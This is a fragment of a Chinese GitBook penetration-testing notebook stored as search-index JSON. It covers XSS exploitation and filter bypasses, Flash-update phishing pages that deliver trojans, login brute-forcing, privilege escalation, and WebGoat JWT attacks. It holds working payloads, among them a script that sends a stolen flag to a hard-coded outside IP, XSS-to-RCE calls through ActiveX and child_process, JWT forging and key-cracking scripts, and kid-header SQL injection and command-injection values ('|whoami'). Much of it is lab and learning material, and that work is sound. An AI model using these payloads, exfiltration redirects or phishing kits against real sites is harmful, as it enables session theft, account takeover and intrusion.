"},"01.渗透测试/02.Web安全/04.跨站脚本攻击/03.漏洞利用.html":{"url":"01.渗透测试/02.Web安全/04.跨站脚本攻击/03.漏洞利用.html","title":"03.漏洞利用","keywords":"","body":"测试流程 01.F12查看数据输出点选择闭合方式 输出在属性里 例如输出的位置位于value属性中： 我们可以选择直接闭合标签： \"> // 输出后如下: \" type=text> 如果 被过滤的话可以换成选择使用事件来闭合属性，并将后面的引号注释掉或闭合： \" autofocus onfocus=alert(1)// \" autofocus onfocus=alert(1) \" // 输出后如下: 还有一些特殊的场景，如： 这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本。 输出在HTML标签之间 例如输出的位置如下： [输出] 直接提交 alert(1) 即可触发XSS，但是当标签是不能执行脚本的标签时，如下面这几个： 那么就得先把那个标签闭合，然后在注入XSS语句，例如： alert(1) 输出在script标签之间 例如： var x = \"input\"; 可控位置在input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了： \";alert(1)// // 输出后如下: var x = \"\";alert(1)//\"; 02.尝试插入比较正常的HTML标签 例如：、、、 等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。 03.尝试插入不闭合的标签 例如：、、i>、u>、 等，然后看一下返回响应，是否对开放的标签也有过滤。 04.测试常见的XSS向量 观察标签，事件，协议等是否有漏网之鱼 self xss提升危害 分享功能，其他人查看时触发 绕过httponly Apache httpOnly Cookie泄露( CVE-2012-0053) 影响版本：Apache2.2.0-Apache2.2.1 当客户端请求的cookie超过4KB时，无论cookie是否带有httponly，Apache HTTPD Server都会将Cookie的明文信息打印到页面上 CORS+cookie回显 例题 https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss 条件1 response数据包中 Access-Control-Allow-Headers: X-Requested-With，说明了我们可以通过XHR请求来访问网站 XMLHttpRequest是用于在后台与服务器交换数据。如果设置XHR请求网站，那么请头部必然会带有：Origin:xxx，则会被服务器视为同源访问 条件2 没有关闭debug模式，导致cookie回显 利用location.href重定向到vps，从而带出cookie var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange=function(){ if(xmlhttp.readyState==4){ location.href='http://106.15.250.162:8888/?flag='+ xmlhttp.responseText.match('flag\\\\{(.\\*?)\\\\}')[1]}}; } } xmlhttp.open('GET','/index.php/treehole/view?id=',true); xmlhttp.send(''); CST--trace请求 TRACE 方法会返回原始请求报文，其中就包含了cookie https://www.cnblogs.com/gaopei/p/11380349.html debug信息泄漏 比如phpinfo，thinkphp框架debug信息等 攻击面拓展 钓鱼 通过 XSS 盗取 Cookie Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。最简单的比如：alert(document.cookie) ，执行后会弹出当前页面的cookie信息。在目标没有“同源策略”的保护下，我们可以利用XSS盗取目标网站管理员的Cookie。 在一般的通用CMS下呢，为了通用模板的兼容性，许多CMS本身不会使用“同源策略”等其他手段来防护XSS漏洞，而是使用自建的过滤函数来处理，在这种情况下，一旦出现XSS漏洞，我们就可以直接获取目标的Cookie然后使用特定的方法来传输cookie。 这里，我们可以利用网上现成的或自己搭建的XSS平台来完成利用过程。 Flash 弹窗钓鱼 项目一地址：https://github.com/Wileysec/adobe-flash-phishing-page 该项目是模仿的 Flash Player 中文官网的页面： 需要在index.html中的加入我们制作的木马的链接地址： 项目二地址：https://github.com/r00tSe7en/Flash-Pop 该项目是一个逼真的Flash更新提醒的弹窗，强迫症都会忍不住去点击下载的： 找到flash.js，搜索链接“https://www.se7ensec.cn/”，将其改为我们制作的木马的链接地址，然后保存即可： RCE 为了大大提升 XSS 的危害，我们可以利用 JavaScript 来执行系统命令。 使用 WScript.Shell 执行系统命令 条件 Internet Explorer 在IE上打开设置中的Intertnet选项-“安全”-“自定义级别”-“对没有标记为安全的activex控件进行初始化和脚本运行-设置成启用，如下 WScript.Shell（Windows Script Host Runtime Library）是一个对象，对应的文件是C:/WINDOWS/system32/wshom.ocx，Wscript.shell是服务器系统会用到的一种组件。4这个对象可以执行操作系统外壳常用的操作，比如运行程序、读写注册表、环境变量等。简单使用如下： var shell = new ActiveXObject(\"WScript.Shell\"); shell.run(\"calc.exe\"); 有时候为了 Bypass 也可以使用 String.fromCharCode 从 Ascii 来转化恶意代码： 使用 child_process 执行系统命令 如果目标环境启用了 NodeJS 的话，我们也可以利用 NodeJS 的子进程（child_process）调用并执行系统命令： ');\"> 能执行系统命令了，那么 XSS 在钓鱼攻击中的作用便大大提高了，我们完全可以利用 XSS 反弹 Shell 并上线 Metasploit 或 CS 。 Xmind 2020 XSS to RCE 漏洞利用很简单，在 “思维导图” 中输出 Payload： 切换到 “大纲” 中，按下一个功能键即可触发攻击： 由于 Xmind 启用了 NodeJS 功能，所以我们可以利用 child_process 调用并执行系统命令。 蚁剑的XSS to RCE https://github.com/AntSwordProject/antSword/issues/147 浅谈蚁剑RCE - 先知社区 Bypass 绕过空格 当空格被过滤了时，我们可以用 / 来代替空格： 也可以： 绕过引号 alert(/xss/) alert(`xss`) 绕过括号 throw test 反引号 alert(1) == alert`1` 绕过关键字过滤 大小写绕过 alert(1); 双写绕过 有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过 ipt> alert(\"xss\") ipt> alert(1); 字符串拼接绕过 利用eval()函数 与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。 // 在js中，我们可以用反引号代替单双引号 利用top top[\"al\"+\"ert\"](`xss`); top[\"al\"+\"ert\"](\"xss\"); 字符编码绕过 HTML 实体编码 HTML 编码主要分为10进制和16进制，格式为以 &# 开头以分号 ; 结尾（也可以不带分号）。 test // 十进制 test // 十六进制 test // 也可以不带分号 test // 十进制 // 十六进制 // 也可以不带分号 URL编码 我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。 xx 下面给出几个实例。 test test 注意，伪协议头 javascript: 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。就比如说 http://www.baidu.com 可以被URL编码为 http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d，但是不能把协议也进URL编码：%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d 。 但是伪协议头 javascript: 可以进行HTML编码。 Javascript 编码 我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 、 这样的标签时，解析器会自动切换到JavaScript解析模式，而 src、 href 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。 Javascript 中可以识别的编码类型有： Unicode 编码 八进制编码 十六进制编码 一般情况下我们使用Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。 Unicode 编码 alert(\"xss\") \\u0061\\u006C\\u0065\\u0072\\u0074(\"xss\") \\u0061\\u006C\\u0065\\u0072\\u0074(\"\\u0078\\u0073\\u0073\") test test test 但要注意，我们同样也不能对伪协议头 javascript: 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。 在DOM环境中的JavaScript编码 对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，像下面的XSS向量是不能直接执行的： alert(\"xss\") \\141\\154\\145\\162\\164(\"xss\") test test 如下图，插入之后没有任何反应： 要想让他们能够执行我们要将他们放在DOM环境中，即DOM型的XSS。 测试代码： test var search = \"...\"; document.getElementById('s').innerHTML = search; 以上情况很多都是出现在你搜索后，显示你所查询的关键字，变量 search 是一个可控点，当我们查询一个XSS攻击向量后，变量 search 就会被赋值为这个XSS向量，从而插入到div标签中触发XSS，如下所示： test var search = \"\"; document.getElementById('s').innerHTML = search; 此时如果过滤了 、>、'、\"、&、% 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS向量全部编码，即 的以下编码都可以弹窗： // Unicode编码 \\u003C\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u0020\\u0073\\u0072\\u0063\\u003D\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003A\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u0029\\u003E\\u003C\\u002F\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u003E // 八进制编码 \\74\\151\\146\\162\\141\\155\\145\\40\\163\\162\\143\\75\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\72\\141\\154\\145\\162\\164\\50\\47\\170\\163\\163\\47\\51\\76\\74\\57\\151\\146\\162\\141\\155\\145\\76 // 十六进制编码 \\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e 还有一种让八进制和十六进制编码的XSS攻击向量执行的方式便是将XSS向量放在某个能把字符串当做JavaScript代码来执行的函数里，比如eval()、setTimeout()、setInterval()等函数。如下示例： alert(\"xss\") eval(\"\\141\\154\\145\\162\\164\\50\\42\\170\\163\\163\\42\\51\") test test 或者也可以直接将一整段js代码编码后放入eval()函数中执行。 混合编码 混合编码就是对一个XSS向量同时进行多种编码，如下示例： test // 对javascript:进行HTML编码, 对alert(\"xss\")进行URL编码 test // 对javascript:进行HTML编码, 对alert进行Unicode编码 test 也可以利用解码顺序进行混合编码，如下示例： test 首先对“alert”进行JavaScript Unicode编码： test 然后再对 \\u0061\\u006c\\u0065\\u0072\\u0074 进行URL编码： test 最后对标签中的 javascript:%5c%75...%37%34(\"xss\") 整体进行HTML编码即可： test SVG：XSS的一个黑魔法 标签+html实体编码 &#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41; alert&#40;1) alert&#40;1&#41; Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 22:30:22 "},"01.渗透测试/02.Web安全/05.身份认证/00.前置知识.html":{"url":"01.渗透测试/02.Web安全/05.身份认证/00.前置知识.html","title":"00.前置知识","keywords":"","body":"访问控制 用户访问接口→用户是否合法（认证）→用户是否拥有权限（授权：权限控制和角色控制）→ 接口返回数据 认证 认证就是判断你这个用户是不是合法用户，他是一个过程，可以理解为是一个认证的过程。 用户名和密码：最常见的认证方式，用户通过输入注册时设置的用户名和密码来证明身份。 双因素认证（2FA）：在用户名和密码的基础上，还要求输入第二种验证方式，如手机短信验证码或硬件令牌。 生物识别：如指纹识别、面部识别、虹膜识别等。 OAuth、OpenID等第三方认证：用户通过第三方平台（如Google、Facebook）登录。 授权 授权其实就是你认证成功之后，你的权限能访问系统的那些资源，当我们身份认证通过后需要分配权限决定你可以访问那些资源。 权限控制 权限控制是一种基于用户具有特定权限来限制其对系统资源访问的机制。 每个用户被分配了一组权限，这些权限定义了他们可以执行的操作。 例如，一个用户可能被授予读取、写入或删除文件的权限。当用户尝试访问某个资源时，系统会检查其是否具有足够的权限来执行该操作。如果用户没有所需的权限，则访问将被拒绝。 角色控制 角色控制是一种基于用户具有特定角色来限制其对系统资源访问的机制。 每个角色包含了一组权限，而用户则被分配到不同的角色中。通过将用户与角色相关联，可以灵活地管理用户的权限。 例如，一个管理员角色可能具有更高级别的权限，而普通用户角色则只能执行基本操作。当用户尝试访问某个资源时，系统会检查其所属的角色是否具有足够的权限来执行该操作。如果用户所属角色不具备所需的权限，则访问将被拒绝。 token/cookie/session https://www.bilibili.com/video/BV1ob4y1Y7Ep cookie 产生的原因 因为http是无状态协议，假设我以khaz的身份去访问服务器，等到下一次我再次访问服务器时，服务器还是不知道我是谁，我仍需要向服务器提交数据说明我是khaz。这样就导致了在同一个网站下我每次访问一个服务都需要提交一次数据，很麻烦。 本质 浏览器存储技术，实现每次HTTP请求都自动提交数据给服务器的技术。 机制 当用户第一次登录后，服务器返回的response中会有一个set-cookie字段，当我们的浏览器接收到response后，就会将set-cookie中的值保存到cookie中，然后每次我们登陆时浏览器就会自动在请求中为我们带上cookie，服务端接收后去数据库中核实cookie信息。 实例 通常，我们可以从很多网站的登录界面中看到“请记住我”这样的选项，如果你勾选了它之后再登录，那么在下一次访问该网站的时候就不需要进行重复而繁琐的登录动作了，而这个功能就是通过Cookie实现的。 session 产生的原因 因为cookie是保存在浏览器中的，用户可以随意查看和修改很不安全。 本质 一种概念。让HTTP从无状态连接变为有状态连接（会话状态）。 机制 当用户第一次登录后，服务端会生成session对象用于保存用户信息（可以保存在内存，数据库等地方），同时通过set-cookie字段将session-id保存到浏览器中。 在会话的有效期内，客户端每次请求都会带上session-id，服务端根据session-id找到对应的session，核实用户的身份。 注：会话的有效期是通过设置cookie的有效期实现的。 token 产生的原因 因为session的机制，服务端需要保存session，就会出现一些问题。例如： 大量session对象的存储带来的内存消耗 各服务器之间session的复制 专门用于存储session的服务器宕机 本质 身份令牌 机制 当用户第一次登陆后，服务端会生成一个token令牌。通过 set-cookie字段保存到浏览器中。 在令牌的有效期内，客户端每次请求都会带上token令牌，服务端通过保存的密钥验证签名来核对用户身份。 实例 JWT（json web token） 总结 身份校验手段 保存位置 cookie 客户端保存，服务端不保存 session 客户端只保存session-id，服务端保存session对象 token 客户端保存token，服务端只保存token签名的密 OAUTH OAuth（Open Authorization、开放授权协议） 是一种授权框架，允许用户授权第三方应用访问他们的资源，而不暴露其密码等核心信息。OAuth 2.0是当前广泛使用的版本，通常用于社交登录等场景。例如，在第三方网站上使用微信或者QQ作为账号进行登录，就是使用的oauth协议，只返回给第三方诸如用户名、头像等信息，而不会返回给第三方密码等核心数据。 OAuth 2.0 的一个简单解释 - 阮一峰的网络日志 https://www.ruanyifeng.com/blog/2019/04/oauth_design.html 首先，居民小区就是储存用户数据的网络服务。比如，微信储存了我的好友信息，获取这些信息，就必须经过微信的\"门禁系统\"。 其次，快递员（或者说快递公司）就是第三方应用，想要穿过门禁系统，进入小区。 最后，我就是用户本人，同意授权第三方应用进入小区，获取我的数据。 简单说，OAuth 就是一种授权机制。数据的所有者告诉系统，同意授权第三方应用进入系统，获取这些数据。系统从而产生一个短期的进入令牌（token），用来代替密码，供第三方应用使用。 SSO-CAS单点登录 SSO（Single Sign-On，单点登录）是一种身份验证机制，允许用户通过一次登录访问多个应用系统，而无需为每个系统单独登录。CAS（Central Authentication Service，中央认证服务）是一种流行的开源SSO协议，广泛用于实现单点登录。例如，https://xxx?url=想访问的地址会先重定向到CAS统一登陆地址登陆后即可访问，校园OA等。 聊聊单点登录(SSO)中的CAS认证 - 掘金 https://juejin.cn/post/7143566954597449759#heading-4 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:52:55 "},"01.渗透测试/02.Web安全/05.身份认证/01.登录框.html":{"url":"01.渗透测试/02.Web安全/05.身份认证/01.登录框.html","title":"01.登录框","keywords":"","body":" 目录扫描 js文件提取 敏感信息 接口测试 图片验证码绕过 短信验证码绕过 数据包加密绕过 破解 快速定位前端加密方法 | 回忆飘如雪 BurpCrypto: 对单加密参数的登录接口进行密码爆破的一种方法 – Whwlsfb's Tech Blog 输入一些常见的弱口令，收集加密后的值，然后固定密码，爆破用户名 使用selenium模块模拟手动提交绕过 账密爆破 能枚举用户名就先枚举 用户名 针对不同行业，存在的用户很多都是不一样的，可以去了解一些行业黑话 密码 可以看一下密码的复杂度要求来生成对应字典 社工字典生成： 需要先收集一下邮箱，公司名，工号，网站文章的作者名等信息 其他 ``` 其他站点的账号和密码用于撞库 如果爆破出了用户名，可以将密码参数值固定为true，1，0，对密码参数进行爆破 如果存在邀请码，可以尝试一些特殊的数字组合 666 666666 888 888888 ..... ``` Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-29 17:25:25 "},"01.渗透测试/02.Web安全/05.身份认证/02.越权.html":{"url":"01.渗透测试/02.Web安全/05.身份认证/02.越权.html","title":"02.越权","keywords":"","body":"垂直越权 权限校验不充分，导致低权限用户可以访问高权限用户的接口，比如说随便注册一个账户就能访问各种查询接口 如何挖掘： 如果有管理员账号和普通用户账号就比较简单，管理操作，然后替换数据包中的鉴权部分为普通用户的 如果只有普通用户的账号，我觉得主要是如何获得敏感接口，一种是通过被动扫描来找到接口文档，另一种是通过从js文件中手动构造或者fuzz接口的名称 修复方案 进行合理的权限划分。 权限最小化原则，限制用户不必要的权限，用户权限过期后应当予以回收。 水平越权 普通用户拥有其他平行级别用户的权限 比较常见的就是在获取个人信息处通过遍历id获得其他用户的个人信息，还有通过userid，xxid，/user/userid来进行查询 最好的话还是注册两个账户进行测试，这样更好发现参数区别 越权漏洞和遍历漏洞的区别： 功能点的权限分配不同。越权漏洞产生的功能点是属于特定用户才能使用的，而遍历漏洞产生的功能点是应用本身就需要用到的，只是应用没有做好频率控制和数据拖取限制，导致可以通过遍历某个参数获得大量敏感信息，从而造成危害。 修复方案 一对一，用户id对应一条数据，比如查看个人信息 用户id不应该由用户的传参来决定，应该从session中获取用户id，然后带入数据库中进行查询 一对多，用户id对应多条数据，比如一个用户有多个订单 表结构在设计之初应考虑订单和用户对应的关系 | order_id | order_no | user_id | total_price | pay_status | pay_type | extra_info | | -------- | ----------------- | ------- | ----------- | ---------- | -------- | ---------- | | 1 | 15688187285093508 | 1 | 2492 | 1 | 2 | | | 2 | 15885800076852966 | 10 | 2245 | 1 | 1 | | 可以看到存在其中order_no和user_id存在对应关系，所以将orderNo和从session中获取的userId同时查询可解决越权问题。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:32:50 "},"01.渗透测试/02.Web安全/05.身份认证/03.JWT.html":{"url":"01.渗透测试/02.Web安全/05.身份认证/03.JWT.html","title":"JWT安全","keywords":"","body":"JWT认识 概念 JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通过数字签名来验证数据未被篡改。 令牌工作流程 浏览器发起请求登陆 服务端验证身份，根据算法，将用户标识符打包生成 token, 并且返回给浏览器 浏览器发起请求获取用户资料，把刚刚拿到的 token 一起发送给服务器 服务器发现数据中有 token，验证签名并识别用户身份 服务器返回该用户的用户资料 组成 JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。 hearder和Claims 的内容以 Base64URL 进行了编码。 Base64URL From 维基百科 头部（Header） { \"alg\":\"HS256\", \"kid\":\"webgoat_key\", \"typ\":\"JWT\" } 参数说明: algorithm（alg） :说明JWT签名使用的算法，常见有HS256（默认），RS256 等，也可以为 None不进行签名。 kid：用来指定验证签名的密钥 typ:说明这个 token 的类型为 JWT (可选参数) 声明（Claims） { \"secretid\":\" \" \"aud\": \"webgoat.org\", \"iat\": 1644039735, \"exp\": 1644039795, \"sub\": \"tom@webgoat.org\", \"jti\":\"xxx\", \"nbf\":xxx } 参数说明： secretid：密钥id值，当其为空时，jwt默认alg为none aud：接收jwt的用户 iat：令牌生效时间 exp：令牌到期时间 sub：主题 jti： jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击 nbf：定义在什么时间之前，该jwt都是不可用的. 文档：https://datatracker.ietf.org/doc/html/rfc7519#section-4.1 签名（Signature） ​ 服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容（base64编码后的）用此密码进行加密，生成的字符串就是 JWT 的签名。 以HMAC SHA256为例 HMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(claims),secret) 使用 在http header中添加 Authorization: Bearer 安全性 防篡改取决于私钥和加密算法的安全性。 因为签名所以JWT能够防篡改起到认证功能，但是对于header和Claims部分只进行了base64URL编码，这意味着任何人都可以读取到这部分的信息，所以除非加密，否则不要在JWT的有效负载或报头元素中放置秘密信息。 如何生成JWT 签名解析网站 JSON Web Tokens - jwt.io python 安装模块 https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode pip uninstall JWT pip uninstall PyJWT pip install PyJWT==1.7.1 import jwt import base64 payload = { } key = \"\" headers = { } # 调用jwt库,生成json web token jwt_token = jwt.encode(payload=payload, # payload, 有效载体 key=key, # 进行加密签名的密钥 algorithm=\"HS256\", # 指明签名算法方式, 默认也是HS256 headers=headers # json web token 数据结构包含两部分, payload(有效载体), headers(标头) ).decode('ascii') # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str print(jwt_token) JWT检测 JAVAweb 数据包请求头 Authorization: Bearer 数据包数据格式 攻击手段 未对签名进行验证 WebGoat JWT 12 签名算法置None导致的不校验签名 实验 WebGoat JWT 5 点击reset按钮，抓取数据包，将数据包中的token进行解密 发现在声明部分有admin参数值为false，应该就是根据这个来判断用户是否为管理员 将admin值修改为true 这时候修改了声明部分的内容，签名就失效了，所以要绕过签名验证 将头部alg值改为none，让服务器不进行签名验证 import jwt token = jwt.encode( { \"iat\": 1686993728, \"admin\": \"true\", \"user\": \"Jerry\" } ,algorithm=\"none\",key=\"\") print(token) 形成原因 try { Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken); Claims claims = (Claims) jwt.getBody(); String user = (String) claims.get(\"user\"); boolean isAdmin = Boolean.valueOf((String) claims.get(\"admin\")); if (isAdmin) { removeAllUsers(); } else { log.error(\"You are not an admin user\"); } } catch (JwtException e) { throw new InvalidTokenException(e); } 关键点在于 Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken); 使用了错误的函数parse(accessToken)，而不是parseClaimsJws(accessToken)，导致jwt验证成功 正常情况下 Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken); Jwts.parser() 创建了一个JwtParser类的实例，用于解析和验证JWT。 setSigningKey(JWT_PASSWORD) 设置用于签名JWT的密钥。JWT_PASSWORD变量应包含用于签名JWT的相同密钥。 parseClaimsJws(accessToken) 解析包含在accessToken变量中的JWT，并将其作为Jws对象返回。Claims对象包含JWT的有效负载，通常包括关于用户的信息以及授权请求所需的任何其他数据。 需要注意的是，如果使用提供的密钥无法验证JWT，则parseClaimsJws()方法将抛出SignatureException。 弱密钥 WebGoat JWT 10 工具 ./jwtcrack JWT数据 hashcat python脚本 ''' 1.若签名直接校验成功，则 key_ 为有效密钥； 2.若因数据部分预定义字段错误（jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError）导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥； 3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥； 4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。 ''' import jwt #import termcolor # 提示里给的字典https://github.com/first20hours/google-10000-english dict_path = 'path/10000_en_words.txt' JWT_STR = R'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0' if __name__ == \"__main__\": jwt_str = JWT_STR with open(dict_path) as f: key_ = line.strip() try: jwt.decode(jwt_str, verify=True, key=key_) #print('\\r', '\\bbingo! found key -->', termcolor.colored(key_, 'green'), '', termcolor.colored(key_, 'green'), ' import jwt token = jwt.encode( { \"iss\": \"WebGoat Token Builder\", \"aud\": \"webgoat.org\", \"iat\": 1686136171, \"exp\": 1786136231, # 修改jwt到期时间 \"sub\": \"tom@webgoat.org\", \"username\": \"WebGoat\", # 按题目要求修改名字 \"Email\": \"tom@webgoat.org\", \"Role\": [ \"Manager\", \"Project Administrator\" ] } ,algorithm=\"HS256\",key=\"available\") print(token) 将生成的token提交即可 访问令牌和刷新令牌 形成原因 未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh token去刷新B用户的access token 实验 WebGoat JWT 12 题目给出了Tom的旧token 用jerry访问得到refresh token（密码在源码里） 用jerry的refresh token 去刷新Tom的access token 带上得到的accesstoken，去购物 修复 跟踪哪个access token属于哪个refresh token,还可以检查用户的IP地址或地理位置。 KID注入 WebGoat JWT 13 查看对应源码 Jwt jwt =Jwts.parser().setSigningKeyResolver(new SigningKeyResolverAdapter() { xxxxxxx }).parseClaimsJws(token); Claims claims = (Claims) jwt.getBody(); String username = (String) claims.get(\"username\"); if (\"Jerry\".equals(username)) { return failed(this).feedback(\"jwt-final-jerry-account\").build(); } if (\"Tom\".equals(username)) { return success(this).build(); } else { return failed(this).feedback(\"jwt-final-not-tom\").build(); } } catch (JwtException e) { return failed(this).feedback(\"jwt-invalid-token\").output(e.toString()).build(); } 逻辑：获取密钥，然后解析token，获得claims中的username，如果为Tom则删除成功。 关键：获取密钥的部分 new SigningKeyResolverAdapter() { @Override public byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) { final String kid = (String) header.get(\"kid\"); try (var connection = dataSource.getConnection()) { // 通过查询kid来获得key，很明显存在sql注入 ResultSet rs =connection.createStatement().executeQuery(\"SELECT key FROM jwt_keys WHERE id = '\" + kid + \"'\"); while (rs.next()) { // 返回base64解码后的key return TextCodec.BASE64.decode(rs.getString(1)); } } catch (SQLException e) { errorMessage[0] = e.getMessage(); } return null; } 正常的思路是通过对kid参数进行sql注入，伪造key SELECT key FROM jwt_keys WHERE id = '\" + kid + \"' 因为Tom的jwt中kid为webgoat_key，说明在jwt_keys表中有一个id的值为webgoat_key。 所以可以对kid注入 kid: y' and 1=2 union select id from jwt_keys where id ='webgoat_key 这样sql查询的结果就为webgoat_key，即key为webgoat_key，但是因为 TextCodec.BASE64.decode(rs.getString(1)); 无法对webgoat_key进行base64解码，就会抛出异常。 用webgoat_key作为key 通过源码得到真正的key为 key = base64.b64decode(\"qwertyqwerty1234\") payload import jwt import base64 # payload token_dict = { \"iat\": 1529569536, \"iss\": \"WebGoat Token Builder\", \"exp\": 2018905304, \"aud\": \"webgoat.org\", \"sub\": \"jerry@webgoat.com\", \"username\": \"Tom\", \"Email\": \"jerry@webgoat.com\", \"Role\": [\"Cat\"] } key = base64.b64decode(\"qwertyqwerty1234\") # headers headers = { \"typ\": \"JWT\", # \"kid\": \"123' and 1=2 union select id FROM jwt_keys WHERE id='webgoat_key\", \"kid\": \"webgoat_key\", \"alg\": \"HS256\" } # 调用jwt库,生成json web token jwt_token = jwt.encode(payload=token_dict, # payload, 有效载体 key=key, # 进行加密签名的密钥 algorithm=\"HS256\", # 指明签名算法方式, 默认也是HS256 headers=headers # json web token 数据结构包含两部分, payload(有效载体), headers(标头) ).decode('ascii') # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str print(jwt_token) 利用 选择哪种方法，取决于后端是如何利用kid来找到对应密钥 #目录遍历 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/etc/passwd\" } #sql注入 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"aaaaaaa' UNION SELECT 'key';-- \" #命令执行 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/path/to/key_file|whoami\" } 对称加密绕过--公钥泄露 JWT中最常用的两种算法为HMAC和RSA HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证 RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。 如果对方网站原来使用的是RS256，但是泄露了公钥，我们可以使用该公钥生成签名，并且将alg的值改为HS256，因为HS256为对称加密算法，所以网站就会使用该公钥验证签名，自然签名可以通过验证。 参考文章 https://jwt.io/introduction http://www.xianxianlabs.com/blog/2018/06/03/96.html https://www.freebuf.com/vuls/216457.html Tips 不知道身份检验的参数 通过注销登录的返回包中的setcookie可以知道 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:42:17 "},"01.渗透测试/02.Web安全/05.身份认证/04.OAUTH.html":{"url":"01.渗透测试/02.Web安全/05.身份认证/04.OAUTH.html","title":"04.OAUTH","keywords":"","body":"Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 17:03:08 "},"01.渗透测试/02.Web安全/05.身份认证/05.一些案例.html":{"url":"01.渗透测试/02.Web安全/05.身份认证/05.一些案例.html","title":"05.一些案例","keywords":"","body":"任意账户绑定微信逻辑缺陷案例 https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496658&idx=1&sn=a962d7f0a95d295e95082d39881b8d9a&chksm=e8a5f9b1dfd270a74ea0acbd11f75a1fd1c66ba1ab0d89497b95e7db43d459349e75863cba67&scene=58&subscene=0#rd Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-23 09:48:09 